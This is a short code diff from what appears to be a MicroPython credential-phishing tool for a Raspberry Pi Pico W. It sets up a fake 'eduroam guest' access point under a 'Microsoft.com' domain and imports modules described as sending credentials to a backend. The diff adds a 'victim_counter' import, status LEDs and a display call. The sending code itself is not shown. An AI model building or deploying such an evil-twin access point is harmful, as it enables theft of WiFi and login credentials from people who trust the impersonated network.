@@ -8,18 +8,19 @@ import _thread
 import network
 from reset_wifi import reset_wifi # Disables/resets all WiFi interfaces
 from send_data import upload_wifi_data # Sends credentials to a backend
+from victim_counter import *
 
-
+LED_R = Pin(6, Pin.OUT)
+LED_B = Pin(9, Pin.OUT)
+LED_W = Pin(4, Pin.OUT)
 
 AP_NAME = "eduroam guest"
 AP_DOMAIN = "Microsoft.com"
 AP_TEMPLATE_PATH = "ap_templates"
 WIFI_FILE = "wifi.json"
 WIFI_MAX_ATTEMPTS = 3
-user_WIFI = "pico_test"
-PASSWORD_WIFI = "12345678"
-
-
+user_WIFI = "my_wifi"
+PASSWORD_WIFI = "its_password"
 
 def machine_reset():
     """Reboots the Pico W"""
@@ -38,6 +39,8 @@ def setup_mode():
 
     print("Entering setup mode...")
 
+    start_display()
+    
     def serve_static(request, path):
         """Serves static files (CSS, images)"""
         print(f"chemin d'acces : assets/{path}")
